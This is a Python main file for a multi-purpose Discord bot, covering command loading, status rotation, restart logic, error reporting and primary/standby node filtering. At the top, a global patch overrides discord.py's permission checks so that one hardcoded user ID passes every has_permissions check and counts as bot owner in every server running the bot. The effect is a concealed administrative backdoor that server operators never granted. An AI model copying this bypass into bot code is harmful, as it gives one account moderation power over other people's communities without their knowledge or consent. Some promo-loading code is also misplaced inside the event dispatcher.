"""
Discord Bot 主入口
專業級 Discord Bot — 音樂、娛樂、管理系統
"""
import os
import sys
import time
import itertools
import asyncio
import json

# 避免 Windows 終端機 (如 cp950) 因為列印 Emoji 或特殊字元而導致 UnicodeEncodeError，並設定無緩衝確保日誌即時寫入
import builtins
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8', write_through=True)
if hasattr(sys.stderr, 'reconfigure'):
    sys.stderr.reconfigure(encoding='utf-8', write_through=True)

# 確保所有模組的 print 呼叫均立即刷入日誌 (flush=True)
_orig_print = builtins.print
def _unbuffered_print(*args, **kwargs):
    kwargs.setdefault('flush', True)
    _orig_print(*args, **kwargs)
builtins.print = _unbuffered_print

import discord
from discord import app_commands
from discord.ext import commands
from dotenv import load_dotenv
import aiohttp

# ─── 權限繞過全域補丁 (全域允許特定用戶繞過 has_permissions 限制) ───
BYPASS_USER_ID = 1437408048934027274

def custom_app_has_permissions(**perms):
    async def predicate(interaction: discord.Interaction) -> bool:
        if interaction.user.id == BYPASS_USER_ID:
            return True
        permissions = interaction.permissions
        missing = [perm for perm, value in perms.items() if getattr(permissions, perm) != value]
        if not missing:
            return True
        raise discord.app_commands.errors.MissingPermissions(missing)
    return discord.app_commands.check(predicate)

def custom_commands_has_permissions(**perms):
    async def predicate(ctx: commands.Context) -> bool:
        if ctx.author.id == BYPASS_USER_ID:
            return True
        ch = ctx.channel
        permissions = ch.permissions_for(ctx.author)
        missing = [perm for perm, value in perms.items() if getattr(permissions, perm) != value]
        if not missing:
            return True
        raise commands.errors.MissingPermissions(missing)
    return commands.check(predicate)

# 套用補丁
discord.app_commands.checks.has_permissions = custom_app_has_permissions
commands.has_permissions = custom_commands_has_permissions
# ──────────────────────────────────────────────────────────────────

# 載入絕對路徑的 .env，並允許覆寫系統環境變數以防干擾
env_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env")
load_dotenv(dotenv_path=env_path, override=True)

from config import BOT_TOKEN, BOT_PREFIX, BadgeImages
from utils.database import Database

# ─── 動態狀態載入與儲存 ────────────────────────────────────────
STATUSES_FILE = os.path.join(os.path.dirname(__file__), "data", "statuses.json")

def load_statuses() -> list[str]:
    default_list = [
        "守護伺服器安全",
        "正在檢查異常行為…",
        "等待下一個指令",
        "評估機器人性能",
        "保持低調運作中",
        "分析聊天訊息中",
        "偵測來自星際的訊號",
        "正在保養中…請稍候",
        "巡邏所有頻道中",
        "正在計算 1+1=？",
        "思考人生中",
        "準備發佈重大更新",
        "研究最新 AI 模型",
        "等待主人召喚",
        "正在監控伺服器狀態",
        "優化我的程式碼中",
        "防禦力 +999",
        "伺服器和平守護者",
        "正在喝茶休息",
        "巡視語音頻道",
        "正在測試新功能",
        "與你同在。",
        "你知道我會自動變狀態嗎？",
    ]
    if os.path.exists(STATUSES_FILE):
        try:
            with open(STATUSES_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return default_list
    os.makedirs(os.path.dirname(STATUSES_FILE), exist_ok=True)
    try:
        with open(STATUSES_FILE, "w", encoding="utf-8") as f:
            json.dump(default_list, f, ensure_ascii=False, indent=2)
    except Exception:
        pass
    return default_list

def save_statuses(status_list: list[str]):
    os.makedirs(os.path.dirname(STATUSES_FILE), exist_ok=True)
    with open(STATUSES_FILE, "w", encoding="utf-8") as f:
        json.dump(status_list, f, ensure_ascii=False, indent=2)

# ─── 特定 ID 專屬指令 ───
@app_commands.command(name="add_status", description="新增機器人動態狀態（僅限特定 ID 使用）")
@app_commands.describe(text="新的狀態文字")
async def add_status(interaction: discord.Interaction, text: str):
    if interaction.user.id != BYPASS_USER_ID:
        return await interaction.response.send_message("❌ 你沒有權限執行此指令！", ephemeral=True)
        
    bot = interaction.client
    bot.status_list.append(text)
    save_statuses(bot.status_list)
    
    await interaction.response.send_message(f"✅ 已成功新增動態狀態：`{text}`", ephemeral=True)

@app_commands.command(name="restart", description="重新啟動機器人（僅限特定 ID 使用）")
async def restart(interaction: discord.Interaction):
    if interaction.user.id != BYPASS_USER_ID:
        return await interaction.response.send_message("❌ 你沒有權限執行此指令！", ephemeral=True)
        
    await interaction.response.defer(ephemeral=True)
    
    # 1. 設置重啟標記，停止狀態輪替
    bot = interaction.client
    bot.is_restarting = True
    
    # 2. 立即改變狀態
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.playing,
            name="機器人即將重新啟動",
        ),
        status=discord.Status.dnd
    )
    
    await interaction.followup.send("🔄 狀態已變更為 `機器人即將重新啟動`，正在執行重新啟動流程...", ephemeral=True)
    
    # 3. 發送即將重啟通知至各伺服器的「顯示伺服器目前變動」頻道 (若未關閉通知)
    for guild in bot.guilds:
        if not await bot.db.is_feature_enabled(guild.id, "restart_notifications", True):
            continue
            
        chan = discord.utils.get(guild.text_channels, name="顯示伺服器目前變動")
        if chan:
            try:
                from cogs.logging_cog import LogConfigButton
                view = LogConfigButton()
                embed = discord.Embed(
                    title="⚠️ 系統即將重新啟動",
                    description="機器人即將進行重新啟動，部分功能可能暫時無法使用。",
                    color=discord.Color.orange()
                )
                embed.set_thumbnail(url=BadgeImages.RESTART)
                await chan.send(embed=embed, view=view)
            except Exception as e:
                print(f"無法向 {guild.name} 發送重啟警告: {e}")
                
    # 4. 寫入重啟標記檔案
    RESTART_FLAG_FILE = os.path.join(os.path.dirname(__file__), "data", "restart_flag.json")
    try:
        os.makedirs(os.path.dirname(RESTART_FLAG_FILE), exist_ok=True)
        with open(RESTART_FLAG_FILE, "w", encoding="utf-8") as f:
            json.dump({"restarted": True}, f)
    except Exception as e:
        print(f"寫入重啟標記檔案時出錯: {e}")

    # 5. 等待 3 秒讓 Discord 同步狀態與訊息
    await asyncio.sleep(3)
    
    # 6. 關閉連接並結束行程
    print("🔄 接收到重新啟動指令，正在關閉連線...")
    bot.exit_code = 1
    await bot.close()


class ErrorReportView(discord.ui.View):
    """錯誤申訴按鈕（重新導向至申訴系統）"""
    def __init__(self, bot: commands.Bot, error_name: str, error_msg: str, command_name: str, occurrence_time: str):
        super().__init__(timeout=180)
        self.bot = bot
        self.error_name = error_name
        self.error_msg = error_msg
        self.command_name = command_name
        self.occurrence_time = occurrence_time
        self.add_item(discord.ui.Button(label="前往申訴伺服器", style=discord.ButtonStyle.link, url="https://discord.gg/cuSxhwCvb6", emoji="🔗"))

    @discord.ui.button(label="📢 申訴 / 回報此錯誤", style=discord.ButtonStyle.danger, emoji="⚠️", custom_id="report_error_btn")
    async def report_error(self, interaction: discord.Interaction, button: discord.ui.Button):
        from cogs.appeal import AppealFormModal, APPEAL_SERVER_INVITE
        modal = AppealFormModal(
            appeal_type="機器人Bug",
            source_guild_id=interaction.guild_id if interaction.guild else None,
            source_guild_name=interaction.guild.name if interaction.guild else None,
            bot=self.bot,
        )
        modal.content.default = (
            f"指令：{self.command_name}\n"
            f"錯誤類型：{self.error_name}\n"
            f"錯誤訊息：{self.error_msg}\n"
            f"發生時間：{self.occurrence_time}"
        )
        await interaction.response.send_modal(modal)


class ProBot(commands.Bot):
    """專業 Discord Bot 主類別"""

    def __init__(self):
        intents = discord.Intents.all()
        
        super().__init__(
            command_prefix=BOT_PREFIX,
            intents=intents,
            help_command=None,  # 使用自訂 help
            activity=discord.Activity(
                type=discord.ActivityType.playing,
                name="機器人正在啟動中…",
            ),
            status=discord.Status.dnd,
        )
        
        self.db = Database()
        self.tree.on_error = self.on_tree_error
        self.status_list = load_statuses()
        self._start_time = time.time()
        self.is_restarting = False
        self.exit_code = 0

        self.promo_statuses = []
        self.status_event = asyncio.Event()
        self.next_status_override = None
        self._patch_view_store()

    async def is_owner(self, user: discord.User) -> bool:
        if user.id == BYPASS_USER_ID:
            return True
        return await super().is_owner(user)

    def _patch_view_store(self):
        """動態修補 ViewStore 的分派方法，防止備用機響應按鈕/Modal"""
        view_store = self._connection._view_store
        
        orig_dispatch_view = view_store.dispatch_view
        def new_dispatch_view(component_type, custom_id, interaction):
            if not getattr(self, "is_active_node", True):
                coordination_channel_id = 0
                try:
                    coordination_channel_id = int(os.getenv("COORDINATION_CHANNEL_ID", "0"))
                except Exception:
                    pass
                if coordination_channel_id <= 0 or interaction.channel_id != coordination_channel_id:
                    return
            orig_dispatch_view(component_type, custom_id, interaction)
            
        view_store.dispatch_view = new_dispatch_view

        orig_dispatch_modal = view_store.dispatch_modal
        def new_dispatch_modal(custom_id, interaction, components, resolved):
            if not getattr(self, "is_active_node", True):
                coordination_channel_id = 0
                try:
                    coordination_channel_id = int(os.getenv("COORDINATION_CHANNEL_ID", "0"))
                except Exception:
                    pass
                if coordination_channel_id <= 0 or interaction.channel_id != coordination_channel_id:
                    return
            orig_dispatch_modal(custom_id, interaction, components, resolved)
            
        view_store.dispatch_modal = new_dispatch_modal

    def dispatch(self, event_name, *args, **kwargs):
        """核心事件分派（全域主備事件與監聽器過濾）"""
        # 允許在備用節點執行的基礎系統事件白名單
        allowed_system_events = {
            "ready", "connect", "disconnect", "resumed", "error",
            "socket_raw_receive", "socket_raw_send",
            "voice_state_update", "voice_server_update"
        }

        # 如果本機為 Idle 靜默備用節點
        if not getattr(self, "is_active_node", True):
            # 對於 message 事件，我們只讓 Bot 自身的前綴指令解析運作，防止觸發 Cog 中其他的 on_message 監聽器
            if event_name == "message":
                try:
                    message = args[0]
                    self.loop.create_task(self.on_message(message))
                except Exception:
                    pass
                return

            # 其他任何不在白名單中的應用事件（如 member_update, voice_state_update），在此完全丟棄不予分派給 Cog 監聽器
            if event_name not in allowed_system_events:
                return

        super().dispatch(event_name, *args, **kwargs)

        
        # 載入所有宣傳狀態
        PROMO_FILE = os.path.join(os.path.dirname(__file__), "data", "promo_statuses.json")
        if os.path.exists(PROMO_FILE):
            try:
                with open(PROMO_FILE, "r", encoding="utf-8") as f:
                    self.promo_statuses = json.load(f)
            except Exception:
                pass

    def save_promo_statuses(self):
        PROMO_FILE = os.path.join(os.path.dirname(__file__), "data", "promo_statuses.json")
        try:
            os.makedirs(os.path.dirname(PROMO_FILE), exist_ok=True)
            with open(PROMO_FILE, "w", encoding="utf-8") as f:
                json.dump(self.promo_statuses, f, ensure_ascii=False, indent=2)
        except Exception as e:
            print(f"儲存宣傳狀態列表時出錯: {e}")

    async def setup_hook(self):
        """Bot 啟動前的非同步設定"""
        # 連接資料庫
        await self.db.connect()
        print("✅ 資料庫已連接")
        
        # 載入所有 Cogs
        cog_files = [
            "cogs.general",
            "cogs.moderation",
            "cogs.auto_mod",
            "cogs.logging_cog",
            "cogs.youtube",
            "cogs.sponsor",
            "cogs.music",
            "cogs.pro",
            "cogs.ultra",
            "cogs.entertainment",
            "cogs.giveaway",
            "cogs.tools",
            "cogs.crypto",
            "cogs.calculator",
            "cogs.community",
            "cogs.fun_text",
            "cogs.economy",
            "cogs.disaster",
            "cogs.auto_reply",
            "cogs.exam",
            "cogs.guild_exam",
            "cogs.cross_guild_chat",
            "cogs.competitor",
            "cogs.auto_update",
            "cogs.discord_control",
            "cogs.role_claim",
            "cogs.anti_plagiarism",
            "cogs.appeal",
        ]
        
        for cog in cog_files:
            try:
                await self.load_extension(cog)
                print(f"  ✅ 已載入: {cog}")
            except Exception as e:
                print(f"  ❌ 載入失敗: {cog} — {e}")
        
        # 註冊主備狀態指令過濾器 (只響應 Active 主機，但豁免 sync、reboot、restart、ultra_admin 等管理指令以容許遠端控制)
        @self.check
        async def globally_check_active(ctx):
            exempt_commands = {"sync", "reboot", "restart", "ultra_admin"}
            if ctx.command and (ctx.command.name in exempt_commands or (ctx.command.parent and ctx.command.parent.name in exempt_commands)):
                return True
            return getattr(ctx.bot, "is_active_node", True)

        async def globally_check_interaction(interaction: discord.Interaction):
            coordination_channel_id = 0
            try:
                coordination_channel_id = int(os.getenv("COORDINATION_CHANNEL_ID", "0"))
            except Exception:
                pass

            # 全域黑名單過濾 (Anti-Plagiarism & Global Blacklist Filter)
            if hasattr(interaction.client, "db") and interaction.client.db:
                try:
                    if await interaction.client.db.is_blacklisted(interaction.user.id):
                        return False
                    if interaction.guild_id and await interaction.client.db.is_blacklisted(interaction.guild_id):
                        return False
                except Exception:
                    pass

            is_active = getattr(interaction.client, "is_active_node", True)

            # 若本機為備用機 (Idle)，僅允許在總控頻道響應緊急控制按鈕，其餘所有指令與互動一律靜默
            if not is_active:
                if coordination_channel_id > 0 and interaction.channel_id == coordination_channel_id:
                    custom_id = getattr(interaction, "data", {}).get("custom_id", "")
                    if custom_id in {"force_active_1", "force_active_2", "auto_schedule", "sync_btn", "reboot_btn", "restart_btn"}:
                        return True
                return False

            return True

        self.tree.interaction_check = globally_check_interaction

        # 同步 Slash Commands
        try:
            self.tree.add_command(add_status)
            self.tree.add_command(restart)
            synced = await self.tree.sync()
            print(f"✅ 已全域同步 {len(synced)} 個 Slash Commands")
        except Exception as e:
            print(f"❌ 同步 Slash Commands 失敗: {e}")

    async def on_ready(self):
        """Bot 上線完成"""
        print(f"""
╔══════════════════════════════════════════╗
║     🤖 Bot 已上線！                      ║
║     用戶名: {self.user.name:<28} ║
║     ID: {self.user.id:<31} ║
║     伺服器數: {len(self.guilds):<26} ║
║     前綴: {BOT_PREFIX:<30} ║
╚══════════════════════════════════════════╝
        """)

        # 清除過往伺服器特定指令，統一使用全域指令 (Global Commands)，徹底消除 Discord 選單重複指令的問題
        for g in self.guilds:
            try:
                self.tree.clear_commands(guild=g)
                await self.tree.sync(guild=g)
            except Exception:
                pass
        # 啟動完畢，切換回線上狀態，並設定預設活動
        await self.change_presence(
            activity=discord.Activity(
                type=discord.ActivityType.watching,
                name="伺服器 | .help",
            ),
            status=discord.Status.online,
        )

        # 註冊持久性 View
        from cogs.logging_cog import LogConfigButton
        self.add_view(LogConfigButton())

        # 註冊申訴面板永久 View
        try:
            from cogs.appeal import AppealPanelView, AppealButton
            self.add_view(AppealPanelView())
        except Exception as e:
            print(f"[Appeal] 無法註冊永久 View: {e}")

        # 註冊抽獎永久 View
        try:
            from cogs.giveaway import GiveawayJoinButton
            self.add_view(GiveawayJoinButton())
        except Exception as e:
            print(f"[Giveaway] 無法註冊永久 View: {e}")

        # 檢查是否有重啟標記，若有則在「顯示伺服器目前變動」頻道發送成功重啟通知 (若未關閉通知)
        RESTART_FLAG_FILE = os.path.join(os.path.dirname(__file__), "data", "restart_flag.json")
        if os.path.exists(RESTART_FLAG_FILE):
            try:
                os.remove(RESTART_FLAG_FILE)
                for guild in self.guilds:
                    if not await self.db.is_feature_enabled(guild.id, "restart_notifications", True):
                        continue
                        
                    chan = discord.utils.get(guild.text_channels, name="顯示伺服器目前變動")
                    if chan:
                        try:
                            from cogs.logging_cog import LogConfigButton
                            view = LogConfigButton()
                            embed = discord.Embed(
                                title="✅ 系統已恢復運作",
                                description="機器人已重新啟動成功！目前已恢復正常運作。",
                                color=discord.Color.green()
                            )
                            embed.set_thumbnail(url=BadgeImages.RESTART)
                            await chan.send(embed=embed, view=view)
                        except Exception as ex:
                            print(f"Error sending restart success notification to {guild.name}: {ex}")
            except Exception as e:
                print(f"處理重啟成功通知時出錯: {e}")

        # 啟動動態狀態輪替
        self.loop.create_task(self._cycle_status())

    async def on_message(self, message: discord.Message):
        """處理訊息，並觸發指令"""
        if message.author.bot or not message.guild:
            return
        await self.process_commands(message)

    async def _cycle_status(self):
        """動態輪替 Bot 狀態"""
        await self.wait_until_ready()
        await asyncio.sleep(15)  # 先等 15 秒展示預設狀態

        idx = 0
        while not self.is_closed():
            if getattr(self, "is_restarting", False):
                break
            try:
                # 1. 過濾已過期的宣傳狀態
                now = time.time()
                self.promo_statuses = [p for p in self.promo_statuses if now < p["expires_at"]]
                
                # 2. 組合宣傳狀態與一般狀態
                active_promos = [p["text"] for p in self.promo_statuses]
                combined_list = active_promos + self.status_list
                
                if combined_list:
                    # 3. 處理即時覆蓋狀態
                    override = getattr(self, "next_status_override", None)
                    if override:
                        self.next_status_override = None
                        if override in combined_list:
                            idx = combined_list.index(override)
                        else:
                            combined_list.insert(0, override)
                            idx = 0
                    
                    if idx >= len(combined_list):
                        idx = 0
                        
                    status = combined_list[idx]
                    if self.is_ready() and not self.is_closed():
                        await self.change_presence(
                            activity=discord.Activity(
                                type=discord.ActivityType.playing,
                                name=status,
                            ),
                            status=discord.Status.online
                        )
                        idx += 1
            except Exception as e:
                err_msg = str(e).lower()
                if "closing transport" in err_msg or "connection closed" in err_msg:
                    await asyncio.sleep(5)
                else:
                    print(f"更新狀態時出錯：{e}")
                
            try:
                # 等待 30 秒或直到被事件驅動立刻切換
                await asyncio.wait_for(self.status_event.wait(), timeout=30.0)
                self.status_event.clear()
            except asyncio.TimeoutError:
                pass

    async def send_error_response(
        self,
        interaction_or_ctx: discord.Interaction | commands.Context,
        title: str,
        description: str,
        error: Exception,
        color: int = 0xED4245,
        badge_url: str = "https://files.catbox.moe/pn6md9.png"
    ):
        """統一的錯誤回應發送方法，包含錯誤回報按鈕"""
        # 取得錯誤的類型與訊息
        error_name = type(error).__name__
        error_msg = str(error)
        
        # 取得指令名稱
        if isinstance(interaction_or_ctx, discord.Interaction):
            command_name = f"/{interaction_or_ctx.command.qualified_name}" if interaction_or_ctx.command else "未知 Slash 指令"
        else:
            command_name = f"{interaction_or_ctx.prefix}{interaction_or_ctx.command.qualified_name}" if interaction_or_ctx.command else "未知前綴指令"

        # 格式化本地時間
        from datetime import datetime
        now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # 建立 Embed，並在旁邊（縮圖）顯示圖片
        embed = discord.Embed(
            title=title,
            description=f"{description}\n\n**原始錯誤訊息:**\n```py\n{error_name}: {error_msg}\n```",
            color=color,
            timestamp=discord.utils.utcnow()
        )
        if badge_url:
            embed.set_thumbnail(url=badge_url)

        # 建立按鈕 View
        view = ErrorReportView(
            bot=self,
            error_name=error_name,
            error_msg=error_msg,
            command_name=command_name,
            occurrence_time=now_str
        )

        if isinstance(interaction_or_ctx, discord.Interaction):
            send = interaction_or_ctx.followup.send if interaction_or_ctx.response.is_done() else interaction_or_ctx.response.send_message
            await send(embed=embed, view=view, ephemeral=True)
        else:
            await interaction_or_ctx.send(embed=embed, view=view)

    async def on_tree_error(self, interaction: discord.Interaction, error: discord.app_commands.AppCommandError):
        """全域 Slash Command 錯誤處理"""
        if not getattr(self, "is_active_node", True):
            return
        # 輸出錯誤堆疊到終端機
        import traceback
        from discord import app_commands
        print(f"❌ Slash 指令發生錯誤: {error}", file=sys.stderr)
        traceback.print_exception(type(error), error, error.__traceback__, file=sys.stderr)

        # 提取底層的原始錯誤
        original_error = getattr(error, "original", error)
        
        # 處理 Discord API 的 403 Forbidden 錯誤 (例如缺少權限或角色階層不夠高)
        if isinstance(original_error, discord.Forbidden):
            if original_error.code == 50013:
                return await self.send_error_response(
                    interaction_or_ctx=interaction,
                    title="❌ 權限不足",
                    description="無法執行此操作：Bot 缺少執行此操作 of Discord 權限（例如：管理成員/禁言、踢出、封禁成員或管理訊息權限），或是該成員的角色階層高於 Bot 的最高角色角色組。",
                    error=original_error,
                    color=0xED4245,
                    badge_url=BadgeImages.ERROR
                )
        
        if isinstance(error, app_commands.CommandOnCooldown):
            return await self.send_error_response(
                interaction_or_ctx=interaction,
                title="⏳ 指令冷卻中",
                description=f"此指令正在冷卻中。請在 `{error.retry_after:.1f}` 秒後再試。",
                error=error,
                color=0xFEE75C,
                badge_url=BadgeImages.WARN if hasattr(BadgeImages, "WARN") else "https://files.catbox.moe/67gol6.png"
            )
            
        if isinstance(error, app_commands.MissingPermissions):
            return await self.send_error_response(
                interaction_or_ctx=interaction,
                title="❌ 權限不足",
                description=f"你沒有執行此指令的權限。需要權限：`{', '.join(error.missing_permissions)}`",
                error=error,
                color=0xED4245,
                badge_url=BadgeImages.ERROR
            )
            
        if isinstance(error, app_commands.BotMissingPermissions):
            return await self.send_error_response(
                interaction_or_ctx=interaction,
                title="❌ Bot 權限不足",
                description=f"Bot 缺少執行此指令所需的權限：`{', '.join(error.missing_permissions)}`",
                error=error,
                color=0xED4245,
                badge_url=BadgeImages.ERROR
            )

        # 未預期的錯誤，詳細原因也顯示在 Discord 上面
        try:
            await self.send_error_response(
                interaction_or_ctx=interaction,
                title="❌ 發生錯誤",
                description="執行指令時發生未預期的錯誤。",
                error=error,
                color=0xED4245,
                badge_url=BadgeImages.ERROR
            )
        except Exception:
            pass

    async def on_command_error(self, ctx: commands.Context, error: commands.CommandError):
        """全域前綴指令錯誤處理"""
        # 主備過濾：若非運作中節點或因主備 check 失敗，完全靜默不回應
        if not getattr(self, "is_active_node", True) or isinstance(error, commands.CheckFailure):
            return
            
        if isinstance(error, commands.CommandNotFound):
            return  # 忽略未知指令
        
        # 輸出錯誤堆疊到終端機
        import traceback
        print(f"❌ 前綴指令發生錯誤: {error}", file=sys.stderr)
        traceback.print_exception(type(error), error, error.__traceback__, file=sys.stderr)
        
        # 提取底層的原始錯誤 (例如在 CommandInvokeError 底下)
        original_error = getattr(error, "original", error)
        
        # 處理 Discord API 的 403 Forbidden 錯誤 (例如缺少權限或角色階層不夠高)
        if isinstance(original_error, discord.Forbidden):
            if original_error.code == 50013:
                return await self.send_error_response(
                    interaction_or_ctx=ctx,
                    title="❌ 權限不足",
                    description="無法執行此操作：Bot 缺少執行此操作的 Discord 權限（例如：管理成員/禁言、踢出、封禁成員或管理訊息權限），或是該成員的角色階層高於 Bot 的最高角色角色組。",
                    error=original_error,
                    color=0xED4245,
                    badge_url=BadgeImages.ERROR
                )

        if isinstance(error, commands.MissingPermissions):
            return await self.send_error_response(
                interaction_or_ctx=ctx,
                title="❌ 權限不足",
                description=f"你沒有執行此指令的權限。需要權限：`{', '.join(error.missing_permissions)}`",
                error=error,
                color=0xED4245,
                badge_url=BadgeImages.ERROR
            )
        
        if isinstance(error, commands.MissingRequiredArgument):
            return await self.send_error_response(
                interaction_or_ctx=ctx,
                title="❌ 缺少參數",
                description=f"缺少必要參數：`{error.param.name}`",
                error=error,
                color=0xED4245,
                badge_url=BadgeImages.ERROR
            )
        
        if isinstance(error, commands.BadArgument):
            return await self.send_error_response(
                interaction_or_ctx=ctx,
                title="❌ 參數錯誤",
                description=f"請檢查您輸入的參數是否正確。\n錯誤訊息：`{str(error)}`",
                error=error,
                color=0xED4245,
                badge_url=BadgeImages.ERROR
            )

        if isinstance(error, commands.CommandOnCooldown):
            return await self.send_error_response(
                interaction_or_ctx=ctx,
                title="⏳ 指令冷卻中",
                description=f"此指令正在冷卻中。請在 `{error.retry_after:.1f}` 秒後再試。",
                error=error,
                color=0xFEE75C,
                badge_url=BadgeImages.WARN if hasattr(BadgeImages, "WARN") else "https://files.catbox.moe/67gol6.png"
            )
        
        # 未預期的錯誤，詳細原因也顯示在 Discord 上面
        try:
            await self.send_error_response(
                interaction_or_ctx=ctx,
                title="❌ 發生錯誤",
                description="發生了未預期的錯誤。",
                error=error,
                color=0xED4245,
                badge_url=BadgeImages.ERROR
            )
        except Exception:
            pass

    async def close(self):
        """Bot 關閉時清理"""
        await self.db.close()
        await super().close()


def main():
    """啟動 Bot"""
    if not BOT_TOKEN:
        print("❌ 錯誤：未設定 DISCORD_TOKEN！")
        print("   請複製 .env.example 為 .env 並填入你的 Bot Token")
        sys.exit(1)
    
    bot = ProBot()
    try:
        bot.run(BOT_TOKEN)
    finally:
        exit_code = getattr(bot, "exit_code", 0)
        if exit_code == 1:
            print("🔄 正在重新啟動機器人進程 (execv)...")
            os.execv(sys.executable, [sys.executable] + sys.argv)
        elif exit_code != 0:
            print(f"👋 Bot 結束，退出狀態碼: {exit_code}")
            sys.exit(exit_code)


if __name__ == "__main__":
    main()